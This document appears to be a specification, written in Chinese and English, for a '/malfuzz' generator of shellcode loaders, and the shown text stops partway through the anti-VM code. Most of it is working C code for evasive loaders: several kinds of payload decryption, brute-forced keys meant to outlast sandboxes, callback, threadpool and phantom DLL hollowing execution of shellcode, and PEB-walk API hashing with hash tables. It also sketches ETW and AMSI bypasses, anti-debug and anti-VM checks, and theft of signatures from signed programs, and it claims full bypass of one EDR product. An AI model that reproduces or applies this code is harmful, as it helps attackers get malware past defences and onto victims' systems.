# /malfuzz — Shellcode Loader Fuzz Generation

## Command Syntax

```
/malfuzz <C|C++|Rust> <数量> <shellcode路径> [sign] [sandbox] ["可选描述"]
```

- `sign` — 签名掠夺：从 Program Files 选取已签名 EXE，复制签名/版本信息/图标/时间戳
- `sandbox` — 启用反沙箱 + 反调试（默认不启用）
- 描述可选：用户手动指定技术偏好，不填则随机组合

## Execution Flow

1. 读取 `calc.bin`（项目目录下）生成所有 loader
2. 编译输出到 `fuzz_output_<timestamp>/`
3. 用户验证 calc 弹出后，替换真实 shellcode 重新编译
4. 生成 README.md 汇总

---

## Hard Constraints (ALL loaders)

1. IAT 只保留 3-6 个无害导入（从允许列表选取）
2. 零明文字符串（stack strings 或 XOR 加密）
3. 所有敏感 API 通过 PEB walk + hash 动态解析
4. RW→RX 内存属性分离
5. 无 CRT：`/ENTRY:main /NODEFAULTLIB`
6. 编译：`cl /O2 /Os /GS- /MT /GL /DNDEBUG /link /ENTRY:main /NODEFAULTLIB /SUBSYSTEM:CONSOLE /LTCG /OPT:REF /OPT:ICF /MERGE:.rdata=.text`

### IAT Allowlist
```c
// 只允许以下函数出现在 IAT 中（选 3-6 个）
__declspec(dllimport) void __stdcall GetSystemTimeAsFileTime(void*);
__declspec(dllimport) int __stdcall QueryPerformanceCounter(void*);
__declspec(dllimport) unsigned long __stdcall GetCurrentProcessId(void);
__declspec(dllimport) unsigned long __stdcall GetCurrentThreadId(void);
__declspec(dllimport) int __stdcall IsProcessorFeaturePresent(unsigned long);
__declspec(dllimport) void __stdcall GetStartupInfoW(void*);
```

---

## Technique Pool

### Dimension 1: Encryption

#### XOR (16-32 byte random key)
```c
// PLACEHOLDER_ENCRYPT_XOR
void XorDecrypt(unsigned char* data, unsigned long size, unsigned char* key, unsigned long keyLen) {
    for (unsigned long i = 0; i < size; i++) data[i] ^= key[i % keyLen];
}
```

#### AES-256-CBC (BCrypt)
```c
// PLACEHOLDER_ENCRYPT_AES
// AES-256-CBC via BCrypt (resolved through PEB walk)
typedef long (__stdcall *tBCryptOpenAlgorithmProvider)(void**, const wchar_t*, const wchar_t*, unsigned long);
typedef long (__stdcall *tBCryptSetProperty)(void*, const wchar_t*, unsigned char*, unsigned long, unsigned long);
typedef long (__stdcall *tBCryptGenerateSymmetricKey)(void*, void**, unsigned char*, unsigned long, unsigned char*, unsigned long, unsigned long);
typedef long (__stdcall *tBCryptDecrypt)(void*, unsigned char*, unsigned long, void*, unsigned char*, unsigned long, unsigned char*, unsigned long, unsigned long*, unsigned long);
typedef long (__stdcall *tBCryptDestroyKey)(void*);
typedef long (__stdcall *tBCryptCloseAlgorithmProvider)(void*, unsigned long);

PVOID hBcrypt = EnsureModule(HASH_BCRYPT, bcryptDll);
tBCryptOpenAlgorithmProvider pOpen = (tBCryptOpenAlgorithmProvider)PebGetProc(hBcrypt, HASH_BCryptOpenAlgorithmProvider);
tBCryptSetProperty pSetProp = (tBCryptSetProperty)PebGetProc(hBcrypt, HASH_BCryptSetProperty);
tBCryptGenerateSymmetricKey pGenKey = (tBCryptGenerateSymmetricKey)PebGetProc(hBcrypt, HASH_BCryptGenerateSymmetricKey);
tBCryptDecrypt pDecrypt = (tBCryptDecrypt)PebGetProc(hBcrypt, HASH_BCryptDecrypt);
tBCryptDestroyKey pDestroy = (tBCryptDestroyKey)PebGetProc(hBcrypt, HASH_BCryptDestroyKey);
tBCryptCloseAlgorithmProvider pClose = (tBCryptCloseAlgorithmProvider)PebGetProc(hBcrypt, HASH_BCryptCloseAlgorithmProvider);

void *hAlg = NULL, *hKey = NULL;
wchar_t algAes[] = { 'A','E','S',0 };
wchar_t chainCbc[] = { 'C','h','a','i','n','i','n','g','M','o','d','e',0 };
wchar_t modeCbc[] = { 'C','h','a','i','n','i','n','g','M','o','d','e','C','B','C',0 };
pOpen(&hAlg, algAes, NULL, 0);
pSetProp(hAlg, chainCbc, (unsigned char*)modeCbc, sizeof(modeCbc), 0);
pGenKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);
unsigned long dwResult = 0;
pDecrypt(hKey, pCipher, dwSize, NULL, pIv, 16, pPlain, dwSize, &dwResult, 0);
pDestroy(hKey);
pClose(hAlg, 0);
```

#### RC4 (SystemFunction032)
```c
// PLACEHOLDER_ENCRYPT_RC4
// RC4 via SystemFunction032 (advapi32.dll, resolved via PEB walk)
typedef struct { unsigned long Length; unsigned long MaximumLength; unsigned char* Buffer; } USTRING;
typedef long (__stdcall *tSystemFunction032)(USTRING*, USTRING*);

PVOID hAdvapi = PebGetModule(HASH_ADVAPI32);
tSystemFunction032 pSf032 = (tSystemFunction032)PebGetProc(hAdvapi, HASH_SystemFunction032);
USTRING data = { dwSize, dwSize, pPayload };
USTRING k = { keyLen, keyLen, pKey };
pSf032(&data, &k);  // RC4 is symmetric: encrypt = decrypt
```

#### ChaCha20 (Pure C — 无外部依赖)
```c
// PLACEHOLDER_ENCRYPT_CHACHA20
// 纯 C 实现, 不依赖 BCrypt/advapi32, 无需额外 DLL 加载
// 256-bit key + 96-bit nonce, key 通过 masked-pair 嵌入

#define ROTL32(v, n) (((v) << (n)) | ((v) >> (32 - (n))))
#define QR(a,b,c,d) \
    a+=b; d^=a; d=ROTL32(d,16); c+=d; b^=c; b=ROTL32(b,12); \
    a+=b; d^=a; d=ROTL32(d,8);  c+=d; b^=c; b=ROTL32(b,7);

__forceinline void chacha20_block(unsigned long state[16], unsigned char out[64]) {
    unsigned long s[16];
    for (int i = 0; i < 16; i++) s[i] = state[i];
    for (int i = 0; i < 10; i++) {
        QR(s[0],s[4],s[8],s[12])  QR(s[1],s[5],s[9],s[13])
        QR(s[2],s[6],s[10],s[14]) QR(s[3],s[7],s[11],s[15])
        QR(s[0],s[5],s[10],s[15]) QR(s[1],s[6],s[11],s[12])
        QR(s[2],s[7],s[8],s[13])  QR(s[3],s[4],s[9],s[14])
    }
    for (int i = 0; i < 16; i++) ((unsigned long*)out)[i] = s[i] + state[i];
}

__forceinline void chacha20_crypt(unsigned char* data, unsigned long len,
                                   unsigned char key[32], unsigned char nonce[12]) {
    unsigned long state[16];
    state[0]=0x61707865; state[1]=0x3320646e;
    state[2]=0x79622d32; state[3]=0x6b206574;
    for (int i = 0; i < 8; i++) state[4+i] = ((unsigned long*)key)[i];
    state[12] = 1; // counter starts at 1
    state[13] = ((unsigned long*)nonce)[0];
    state[14] = ((unsigned long*)nonce)[1];
    state[15] = ((unsigned long*)nonce)[2];
    unsigned char block[64];
    for (unsigned long off = 0; off < len; off += 64) {
        chacha20_block(state, block);
        unsigned long chunk = (len - off < 64) ? (len - off) : 64;
        for (unsigned long i = 0; i < chunk; i++) data[off + i] ^= block[i];
        state[12]++;
    }
}

// Key: masked-pair (same pattern as XOR)
static unsigned char g_cc20_masked[32] = { /* build-time generated */ };
static unsigned char g_cc20_mask[32]   = { /* build-time generated */ };
static unsigned char g_cc20_nonce[12]  = { /* build-time generated */ };

// Runtime: derive key then decrypt
// unsigned char key[32];
// for (int i=0; i<32; i++) key[i] = g_cc20_masked[i] ^ g_cc20_mask[i];
// chacha20_crypt(pMem, dwSize, key, g_cc20_nonce);
```

#### XOR Brute-Force (Runtime Key Recovery — 反沙箱 + 反静态分析)
```c
// PLACEHOLDER_ENCRYPT_XOR_BRUTEFORCE
// 16-byte XOR key, 仅 13 bytes 嵌入 (masked pair), 剩余 3 bytes 运行时暴力破解
// 二进制中不存在完整 key → 静态分析无法提取
// 暴力破解循环 (16M iterations, ~1-3秒) 是 CPU-bound → 沙箱超时无法快进
// 双重 OPSEC: key hiding + anti-sandbox delay

// Build-time flow:
// 1. 生成随机 16-byte key
// 2. XOR 加密 payload
// 3. 计算原始 payload 前 16 bytes 的 CRC32
// 4. 嵌入前 13 bytes (masked pair) + CRC32 常量
// 5. 丢弃 key[13..15] — 二进制中不存在

static unsigned char g_partial_masked[13] = { /* build-time: first 13 key bytes, masked */ };
static unsigned char g_partial_mask[13]   = { /* build-time: random mask */ };
static unsigned long g_header_crc32       = 0xDEADBEEF; // CRC32 of first 16 decrypted bytes

__forceinline unsigned long crc32_16(const unsigned char* data) {
    unsigned long c = 0xFFFFFFFF;
    for (int i = 0; i < 16; i++) {
        c ^= data[i];
        for (int j = 0; j < 8; j++) c = (c >> 1) ^ (0xEDB88320 & (-(c & 1)));
    }
    return ~c;
}

__forceinline int brute_force_xor_key(unsigned char* enc_payload, unsigned char* full_key) {
    for (int i = 0; i < 13; i++) full_key[i] = g_partial_masked[i] ^ g_partial_mask[i];
    unsigned char trial[16];
    for (unsigned long b0 = 0; b0 < 256; b0++) {
        full_key[13] = (unsigned char)b0;
        for (unsigned long b1 = 0; b1 < 256; b1++) {
            full_key[14] = (unsigned char)b1;
            for (unsigned long b2 = 0; b2 < 256; b2++) {
                full_key[15] = (unsigned char)b2;
                for (int i = 0; i < 16; i++) trial[i] = enc_payload[i] ^ full_key[i];
                if (crc32_16(trial) == g_header_crc32) return 1;
            }
        }
    }
    return 0;
}

// Usage:
// unsigned char key[16];
// if (!brute_force_xor_key(pMem, key)) return 0; // should never fail on correct machine
// XorDecrypt(pMem, dwSize, key, 16);
```

#### ChaCha20 Brute-Force (Runtime Key Recovery — 强加密 + 反沙箱)
```c
// PLACEHOLDER_ENCRYPT_CHACHA20_BRUTEFORCE
// 32-byte ChaCha20 key, 仅 29 bytes 嵌入, 3 bytes 暴力破解
// 使用上方 chacha20_block / chacha20_crypt 函数
// 验证: CRC32 of first 64 decrypted bytes (一个 ChaCha20 block)

static unsigned char g_cc20bf_masked[29] = { /* build-time: first 29 key bytes, masked */ };
static unsigned char g_cc20bf_mask[29]   = { /* build-time: random mask */ };
static unsigned char g_cc20bf_nonce[12]  = { /* build-time: full nonce */ };
static unsigned long g_cc20bf_crc32      = 0xDEADBEEF; // CRC32 of first 64 decrypted bytes

// CRC32 for 64 bytes
__forceinline unsigned long crc32_64(const unsigned char* data) {
    unsigned long c = 0xFFFFFFFF;
    for (int i = 0; i < 64; i++) {
        c ^= data[i];
        for (int j = 0; j < 8; j++) c = (c >> 1) ^ (0xEDB88320 & (-(c & 1)));
    }
    return ~c;
}

__forceinline int brute_force_chacha20_key(unsigned char* enc_payload, unsigned char* full_key) {
    for (int i = 0; i < 29; i++) full_key[i] = g_cc20bf_masked[i] ^ g_cc20bf_mask[i];
    unsigned char trial[64];
    for (unsigned long b0 = 0; b0 < 256; b0++) {
        full_key[29] = (unsigned char)b0;
        for (unsigned long b1 = 0; b1 < 256; b1++) {
            full_key[30] = (unsigned char)b1;
            for (unsigned long b2 = 0; b2 < 256; b2++) {
                full_key[31] = (unsigned char)b2;
                // Trial decrypt first 64 bytes (one ChaCha20 block)
                __movsb(trial, enc_payload, 64);
                chacha20_crypt(trial, 64, full_key, g_cc20bf_nonce);
                if (crc32_64(trial) == g_cc20bf_crc32) return 1;
            }
        }
    }
    return 0;
}

// Usage:
// unsigned char key[32];
// if (!brute_force_chacha20_key(pMem, key)) return 0;
// chacha20_crypt(pMem, dwSize, key, g_cc20bf_nonce);
```

---

### Dimension 2: Execution Method

> 所有执行方式均为 🟢 Low OPSEC，使用 indirect syscall 分配内存。
> 已移除: EnumChildWindows (部分 EDR 标记), APC Self-Inject/NtTestAlert (ETW 遥测),
> CreateTimerQueueTimer (Ekko 检测关联)

#### Fiber (NT API)
```c
// PLACEHOLDER_EXEC_FIBER
typedef void* (__stdcall *tConvertThreadToFiber)(void*);
typedef void* (__stdcall *tCreateFiber)(unsigned long, void*, void*);
typedef void  (__stdcall *tSwitchToFiber)(void*);

tConvertThreadToFiber pCTTF = (tConvertThreadToFiber)ResolveApi(HASH_KERNEL32, HASH_ConvertThreadToFiber);
tCreateFiber pCF = (tCreateFiber)ResolveApi(HASH_KERNEL32, HASH_CreateFiber);
tSwitchToFiber pSTF = (tSwitchToFiber)ResolveApi(HASH_KERNEL32, HASH_SwitchToFiber);

void* mainFiber = pCTTF(0);
void* scFiber = pCF(0, (void*)pDecrypted, 0);
pSTF(scFiber);
```

#### Callback — CertEnumSystemStore
```c
// PLACEHOLDER_EXEC_CALLBACK_CERT
typedef int (__stdcall *tCertEnumSystemStore)(unsigned long, void*, void*, void*);
tCertEnumSystemStore pCESS = (tCertEnumSystemStore)ResolveApiSafe(HASH_CRYPT32, HASH_CertEnumSystemStore);
pCESS(0x00010000/*CERT_SYSTEM_STORE_CURRENT_USER*/, 0, 0, (void*)pDecrypted);
```

#### Callback — EnumFontsW
```c
// PLACEHOLDER_EXEC_CALLBACK_FONTS
typedef void* (__stdcall *tGetDC)(void*);
typedef int (__stdcall *tEnumFontsW)(void*, void*, void*, long);
tGetDC pGDC = (tGetDC)ResolveApiSafe(HASH_USER32, HASH_GetDC);
tEnumFontsW pEF = (tEnumFontsW)ResolveApiSafe(HASH_GDI32, HASH_EnumFontsW);
void* hdc = pGDC(0);
pEF(hdc, 0, (void*)pDecrypted, 0);
```

#### Callback — EnumSystemGeoID (最冷门，零 EDR 监控)
```c
// PLACEHOLDER_EXEC_CALLBACK_GEO
typedef int (__stdcall *tEnumSystemGeoID)(int, long, void*);
tEnumSystemGeoID pESGI = (tEnumSystemGeoID)ResolveApi(HASH_KERNEL32, HASH_EnumSystemGeoID);
pESGI(16/*GEOCLASS_NATION*/, 0, (void*)pDecrypted);
```

#### Mapping Injection (Indirect Syscall — NtCreateSection)
```c
// PLACEHOLDER_EXEC_MAPPING
typedef long (__stdcall *tNtCreateSection)(void**, unsigned long, void*, void*, unsigned long, unsigned long, void*);
typedef long (__stdcall *tNtMapViewOfSection)(void*, void*, void**, unsigned long, unsigned long, void*, void*, unsigned long, unsigned long, unsigned long);
typedef long (__stdcall *tNtUnmapViewOfSection)(void*, void*);

tNtCreateSection pNCS = (tNtCreateSection)ResolveApi(HASH_NTDLL, HASH_NtCreateSection);
tNtMapViewOfSection pNMVS = (tNtMapViewOfSection)ResolveApi(HASH_NTDLL, HASH_NtMapViewOfSection);
tNtUnmapViewOfSection pNUVS = (tNtUnmapViewOfSection)ResolveApi(HASH_NTDLL, HASH_NtUnmapViewOfSection);

void* hSection = 0;
long long secSize = (long long)dwSize;
pNCS(&hSection, 0x0F001F, 0, &secSize, 0x40/*PAGE_EXECUTE_READWRITE*/, 0x8000000/*SEC_COMMIT*/, 0);
void* pRW = 0; unsigned long long vSize = 0;
pNMVS(hSection, (void*)-1, &pRW, 0, 0, 0, &vSize, 2, 0, 0x04/*PAGE_READWRITE*/);
__movsb((unsigned char*)pRW, pDecrypted, dwSize);
pNUVS((void*)-1, pRW);
void* pRX = 0; vSize = 0;
pNMVS(hSection, (void*)-1, &pRX, 0, 0, 0, &vSize, 2, 0, 0x20/*PAGE_EXECUTE_READ*/);
// Execute via callback on pRX
```

#### Phantom DLL Hollowing (File-backed MEM_IMAGE)
```c
// PLACEHOLDER_EXEC_PHANTOM_DLL
// 1. NtOpenFile on legitimate DLL (e.g. C:\Windows\System32\linkinfo.dll)
// 2. NtCreateSection(SEC_IMAGE) — creates file-backed image section
// 3. NtMapViewOfSection — memory type = MEM_IMAGE (passes memory scanners)
// 4. Find .text section, NtProtectVirtualMemory(RW)
// 5. Overwrite .text with shellcode
// 6. NtProtectVirtualMemory(RX)
// 7. Execute via callback — memory scanner sees file-backed DLL, not private allocation

typedef long (__stdcall *tNtOpenFile)(void**, unsigned long, void*, void*, unsigned long, unsigned long);
tNtOpenFile pNOF = (tNtOpenFile)ResolveApi(HASH_NTDLL, HASH_NtOpenFile);
// Stack string: \??\C:\Windows\System32\linkinfo.dll
wchar_t dllPath[] = {'\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\',
    'S','y','s','t','e','m','3','2','\\','l','i','n','k','i','n','f','o','.','d','l','l',0};
// ... open file, create SEC_IMAGE section, map, overwrite .text, execute ...
```

#### Thread Pool — TP_WORK (PoolParty Local)
```c
// PLACEHOLDER_EXEC_THREADPOOL_WORK
typedef long (__stdcall *tTpAllocWork)(void**, void*, void*, void*);
typedef void (__stdcall *tTpPostWork)(void*);
typedef void (__stdcall *tTpReleaseWork)(void*);

tTpAllocWork pAlloc = (tTpAllocWork)ResolveApi(HASH_NTDLL, HASH_TpAllocWork);
tTpPostWork pPost = (tTpPostWork)ResolveApi(HASH_NTDLL, HASH_TpPostWork);
tTpReleaseWork pRelease = (tTpReleaseWork)ResolveApi(HASH_NTDLL, HASH_TpReleaseWork);

void* pWork = 0;
pAlloc(&pWork, (void*)pDecrypted, 0, 0);
pPost(pWork);
typedef long (__stdcall *tNtDelayExecution)(int, void*);
tNtDelayExecution pDelay = (tNtDelayExecution)ResolveApi(HASH_NTDLL, HASH_NtDelayExecution);
long long wait = -50000000LL;
pDelay(0, &wait);
pRelease(pWork);
```

#### Thread Pool — CreateThreadpoolWait (TpAllocWait + TpSetWait) ★ EDR Tested
```c
// PLACEHOLDER_EXEC_THREADPOOL_WAIT
// Proven: 100% bypass Huorong (2026-05-07)
typedef long (__stdcall *tTpAllocWait)(void**, void*, void*, void*);
typedef void (__stdcall *tTpSetWait)(void*, void*, void*);
typedef void (__stdcall *tTpReleaseWait)(void*);
typedef void* (__stdcall *tCreateEventW)(void*, int, int, void*);

tTpAllocWait pAllocW = (tTpAllocWait)ResolveApi(HASH_NTDLL, HASH_TpAllocWait);
tTpSetWait pSetW = (tTpSetWait)ResolveApi(HASH_NTDLL, HASH_TpSetWait);
tTpReleaseWait pReleaseW = (tTpReleaseWait)ResolveApi(HASH_NTDLL, HASH_TpReleaseWait);
tCreateEventW pCE = (tCreateEventW)ResolveApi(HASH_KERNEL32, HASH_CreateEventW);

void* hEvent = pCE(0, 0, 1, 0); // auto-reset, initially signaled
void* pWait = 0;
pAllocW(&pWait, (void*)pDecrypted, 0, 0);
pSetW(pWait, hEvent, 0); // signaled event triggers immediate callback

typedef long (__stdcall *tNtDelayExecution)(int, void*);
tNtDelayExecution pDelay = (tNtDelayExecution)ResolveApi(HASH_NTDLL, HASH_NtDelayExecution);
long long wait = -50000000LL;
pDelay(0, &wait);
pReleaseW(pWait);
```

---

### Dimension 3: API Resolution (common/peb_resolve.h)

```c
// PLACEHOLDER_PEB_RESOLVE
#pragma once
typedef void* HMODULE;
typedef void* FARPROC;

// PEB structures
typedef struct _UNICODE_STRING { unsigned short Length; unsigned short MaximumLength; wchar_t* Buffer; } UNICODE_STRING;
typedef struct _LDR_ENTRY { void* Reserved1[2]; void* InMemoryOrderLinks[2]; void* Reserved2[2]; void* DllBase; void* EntryPoint; unsigned long SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; } LDR_ENTRY;

// Hash algorithms — one selected per loader
__forceinline unsigned long djb2(const char* s) {
    unsigned long h = 5381; while (*s) h = ((h << 5) + h) + (unsigned char)*s++; return h;
}
__forceinline unsigned long djb2w(const wchar_t* s) {
    unsigned long h = 5381; while (*s) h = ((h << 5) + h) + (unsigned short)*s++; return h;
}
__forceinline unsigned long crc32(const char* s) {
    unsigned long c = 0xFFFFFFFF;
    while (*s) { c ^= (unsigned char)*s++; for (int j=0;j<8;j++) c = (c>>1)^(0xEDB88320&(-(c&1))); }
    return ~c;
}
__forceinline unsigned long jenkins(const char* s) {
    unsigned long h = 0;
    while (*s) { h += (unsigned char)*s++; h += h<<10; h ^= h>>6; }
    h += h<<3; h ^= h>>11; h += h<<15; return h;
}

HMODULE PebGetModule(unsigned long dwHash) {
    void* pPeb;
    #ifdef _WIN64
    pPeb = (void*)__readgsqword(0x60);
    #else
    pPeb = (void*)__readfsdword(0x30);
    #endif
    void** ldr = *(void***)((char*)pPeb + 0x18);
    void* head = (void*)((char*)ldr + 0x20); // InMemoryOrderModuleList
    void* entry = *(void**)head;
    while (entry != head) {
        LDR_ENTRY* mod = (LDR_ENTRY*)((char*)entry - 0x10);
        if (mod->BaseDllName.Buffer) {
            wchar_t upper[64] = {0};
            for (int i = 0; i < mod->BaseDllName.Length/2 && i < 63; i++) {
                wchar_t c = mod->BaseDllName.Buffer[i];
                upper[i] = (c >= L'a' && c <= L'z') ? c - 32 : c;
            }
            if (djb2w(upper) == dwHash) return (HMODULE)mod->DllBase;
        }
        entry = *(void**)entry;
    }
    return 0;
}

FARPROC PebGetProc(HMODULE hMod, unsigned long dwHash) {
    unsigned char* pBase = (unsigned char*)hMod;
    unsigned long e_lfanew = *(unsigned long*)(pBase + 0x3C);
    unsigned long expRva = *(unsigned long*)(pBase + e_lfanew + 0x88);
    if (!expRva) return 0;
    unsigned char* pExp = pBase + expRva;
    unsigned long numNames = *(unsigned long*)(pExp + 0x18);
    unsigned long* pNames = (unsigned long*)(pBase + *(unsigned long*)(pExp + 0x20));
    unsigned long* pFuncs = (unsigned long*)(pBase + *(unsigned long*)(pExp + 0x1C));
    unsigned short* pOrds = (unsigned short*)(pBase + *(unsigned long*)(pExp + 0x24));
    for (unsigned long i = 0; i < numNames; i++) {
        char* name = (char*)(pBase + pNames[i]);
        if (djb2(name) == dwHash) return (FARPROC)(pBase + pFuncs[pOrds[i]]);
    }
    return 0;
}

#define ResolveApi(modHash, procHash) PebGetProc(PebGetModule(modHash), procHash)

// Load module if not already loaded (for user32, gdi32, crypt32, bcrypt, rpcrt4)
static HMODULE EnsureModule(unsigned long modHash) {
    HMODULE h = PebGetModule(modHash);
    if (h) return h;
    // LoadLibraryA resolved from kernel32
    typedef HMODULE (__stdcall *tLoadLibraryA)(const char*);
    tLoadLibraryA pLLA = (tLoadLibraryA)PebGetProc(PebGetModule(HASH_KERNEL32), HASH_LoadLibraryA);
    if (!pLLA) return 0;
    // Module names as stack strings
    if (modHash == HASH_USER32)   { char s[]={'u','s','e','r','3','2','.','d','l','l',0}; return pLLA(s); }
    if (modHash == HASH_GDI32)    { char s[]={'g','d','i','3','2','.','d','l','l',0}; return pLLA(s); }
    if (modHash == HASH_CRYPT32)  { char s[]={'c','r','y','p','t','3','2','.','d','l','l',0}; return pLLA(s); }
    if (modHash == HASH_BCRYPT)   { char s[]={'b','c','r','y','p','t','.','d','l','l',0}; return pLLA(s); }
    if (modHash == HASH_ADVAPI32) { char s[]={'a','d','v','a','p','i','3','2','.','d','l','l',0}; return pLLA(s); }
    if (modHash == HASH_RPCRT4)   { char s[]={'r','p','c','r','t','4','.','d','l','l',0}; return pLLA(s); }
    return 0;
}
#define ResolveApiSafe(modHash, procHash) PebGetProc(EnsureModule(modHash), procHash)

// ============================================================
// IMPORTANT: 大小写约定
// ============================================================
// 以下 module hash 使用 djb2w UPPERCASE (模板中 PebGetModule 将小写转大写)
// 如果你的 peb_resolve.h 使用 LOWERCASE 转换 (c += 0x20), 则 module hash 不同!
// 生成 loader 时 hash 常量必须与 djb2_hash_w 的大小写逻辑匹配
// Uppercase hashes: KERNEL32.DLL → 0x6DDB9555 | NTDLL.DLL → 0x1EDAB0ED
// Lowercase hashes: kernel32.dll → 0x7040EE75 | ntdll.dll → 0x22D3B5ED
// Function hashes (djb2 on ASCII name) 不受大小写影响 — 函数名始终区分大小写
// ============================================================

// Module hashes (djb2w uppercase — 匹配本文件 PebGetModule 模板)
#define HASH_KERNEL32  0x6DDB9555
#define HASH_NTDLL     0x1EDAB0ED
#define HASH_USER32    0x2208CF13
#define HASH_GDI32     0x701206C8
#define HASH_CRYPT32   0x2E9BB986
#define HASH_ADVAPI32  0x64BB3129
#define HASH_BCRYPT    0xEDB54DA3
#define HASH_AMSI      0x668E2AF9
#define HASH_RPCRT4    0x2D0E8CAE

// Function hashes (djb2) — verified values
#define HASH_VirtualAlloc              0x382C0F97
#define HASH_VirtualProtect            0x844FF18D
#define HASH_ConvertThreadToFiber      0xC1283AE9
#define HASH_CreateFiber               0xEB969BA1
#define HASH_SwitchToFiber             0xC2D09E02
#define HASH_CertEnumSystemStore       0xD95DA79A
#define HASH_GetDC                     0x0D3D24AC
#define HASH_ReleaseDC                 0xE43871CD
#define HASH_EnumFontsW                0xC601BEDB
#define HASH_EnumSystemGeoID           0x190F8F87
#define HASH_NtCreateSection           0xD02E20D0
#define HASH_NtMapViewOfSection        0x231F196A
#define HASH_NtUnmapViewOfSection      0x595014AD
#define HASH_NtOpenFile                0xC29C5019
#define HASH_NtAllocateVirtualMemory   0x6793C34C
#define HASH_NtProtectVirtualMemory    0x082962C8
#define HASH_NtClose                   0x8B8E133D
#define HASH_TpAllocWork               0x35829537
#define HASH_TpPostWork                0xC94FC392
#define HASH_TpReleaseWork             0xCB60D48D
#define HASH_TpAllocWait               0x35825889
#define HASH_TpSetWait                 0x70DDF58A
#define HASH_TpReleaseWait             0xCB6097DF
#define HASH_CreateEventW              0x5D01F1B2
#define HASH_NtDelayExecution          0x0A49084A
#define HASH_NtWaitForSingleObject     0x4C6DC63C
#define HASH_NtQueryInformationProcess 0xD034FC62
#define HASH_QueryPerformanceCounter   0xDB4E150D
#define HASH_GetTickCount              0x41AD16B9
#define HASH_LoadLibraryA              0x5FBFF0FB
#define HASH_EtwEventWrite             0x24A8D022
#define HASH_AmsiScanBuffer            0x29FCD18E
#define HASH_SystemFunction032         0xCCCF3585
#define HASH_BCryptOpenAlgorithmProvider 0x2A15DFDD
#define HASH_BCryptSetProperty         0xE9049EEA
#define HASH_BCryptGenerateSymmetricKey 0xA81D472A
#define HASH_BCryptDecrypt             0x690BA834
#define HASH_BCryptDestroyKey          0x7B16C8CC
#define HASH_BCryptCloseAlgorithmProvider 0xFCD0CDC1
#define HASH_LdrLoadDll                0x0307DB23
#define HASH_UuidFromStringA           0xFB4FA7C8
#define HASH_RtlIpv4StringToAddressA   0x0BB2E39B
#define HASH_RtlEthernetStringToAddressA 0x62575497
// VEH (for HBP ETW/AMSI bypass)
#define HASH_AddVectoredExceptionHandler    0x37D1F0D7
#define HASH_RemoveVectoredExceptionHandler 0xC88FFB7C

// Anti-Sandbox APIs
#define HASH_GetUserNameA                   0x9BC3AB46
#define HASH_GetComputerNameA               0xAA63BFB6
#define HASH_GetCursorPos                   0x30EFA295
#define HASH_GetSystemMetrics               0xA988C1A1
#define HASH_GetTickCount64                 0x614DB023
#define HASH_FindFirstFileA                 0xAE2636CF
#define HASH_FindNextFileA                  0xF3B43C46
#define HASH_FindClose                      0xB4E7451C
#define HASH_NtQuerySystemInformation       0xEE4F73A8
#define HASH_GetDiskFreeSpaceExA            0x3DFE2F3C
#define HASH_GlobalMemoryStatusEx           0xE4B211F0
#define HASH_GetEnvironmentVariableA        0x87889701
```

---

### Dimension 4: String Hiding

#### Stack Strings
```c
// PLACEHOLDER_STRINGS_STACK
// Example: "VirtualProtect" as stack string
char sVP[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
```

#### XOR-Encrypted Strings
```c
// PLACEHOLDER_STRINGS_XOR
// Build-time: encrypt all strings with random single-byte key
// Runtime: decrypt before use, zero after use
static unsigned char enc_VirtualProtect[] = {0x19,0x2C,...}; // ^ 0x4F
void DecStr(unsigned char* out, const unsigned char* enc, unsigned long len, unsigned char key) {
    for (unsigned long i = 0; i < len; i++) out[i] = enc[i] ^ key;
}
```

---

### Dimension 5: Defense Evasion

#### ETW Bypass (HBP Patchless)
```c
// PLACEHOLDER_EVASION_ETW
// Set hardware breakpoint on EtwEventWrite, VEH returns STATUS_SUCCESS
// See references/defense_evasion.md for full implementation
```

#### AMSI Bypass (HBP Patchless)
```c
// PLACEHOLDER_EVASION_AMSI
// Set hardware breakpoint on AmsiScanBuffer, VEH returns AMSI_RESULT_CLEAN
```

---

### Dimension 6: Anti-Analysis (sandbox option)

#### Anti-Debug
```c
// PLACEHOLDER_ANTI_DEBUG
void* pPeb = (void*)__readgsqword(0x60);
if (*(unsigned char*)((char*)pPeb + 2)) return 0; // BeingDebugged
if (*(unsigned long*)((char*)pPeb + 0xBC) & 0x70) return 0; // NtGlobalFlag

typedef long (__stdcall *tNtQIP)(void*, unsigned long, void*, unsigned long, unsigned long*);
tNtQIP pNtQIP = (tNtQIP)ResolveApi(HASH_NTDLL, HASH_NtQueryInformationProcess);
unsigned long long port = 0;
pNtQIP((void*)-1, 7/*ProcessDebugPort*/, &port, sizeof(port), 0);
if (port) return 0;

// Timing check
typedef int (__stdcall *tQPC)(void*);
tQPC pQPC = (tQPC)ResolveApi(HASH_KERNEL32, HASH_QueryPerformanceCounter);
long long t1, t2;
pQPC(&t1);
for (volatile int i = 0; i < 1000; i++);
pQPC(&t2);
if (t2 - t1 > 100000) return 0;
```

#### Anti-VM
```c
// PLACEHOLDER_ANTI_VM
// CPUID hypervisor bit
int cpuInfo[4];
__cpuid(cpuInfo, 1);
if (cpuInfo[2] & (1 << 31)) return 0; // Hypervisor present

// Disk size check (< 60GB = likely VM)
typedef int (__stdcall *tGetDiskFreeSpaceExA)(const char*, void*, void*, void*);
tGetDiskFreeSpaceExA pGDFS = (tGetDiskFreeSpaceExA)ResolveApi(HASH_KERNEL32, HASH_GetDiskFreeSpaceExA);
unsigned long long totalBytes = 0;
char sC[] = {'C',':','\\',0};
pGDFS(sC, 0, &totalBytes, 0);
if (totalBytes < 64424509440ULL) return 0; // < 60GB

// RAM check (< 2GB = likely sandbox)
typedef int (__stdcall *tGlobalMemoryStatusEx)(void*);
tGlobalMemoryStatusEx pGMSE = (tGlobalMemoryStatusEx)ResolveApi(HASH_KERNEL32, HASH_GlobalMemoryStatusEx);
typedef struct {
    unsigned long dwLength;
    unsigned long dwMemoryLoad;
    unsigned long long ullTotalPhys;
    unsigned long long ullAvailPhys;
    unsigned long long ullTotalPageFile;
    unsigned long long ullAvailPageFile;
    unsigned long long ullTotalVirtual;
    unsigned long long ullAvailVirtual;
    unsigned long long ullAvailExtendedVirtual;
} MEMSTATUSEX;
MEMSTATUSEX msx;
__stosb((unsigned char*)&msx, 0, sizeof(msx));
msx.dwLength = sizeof(msx);
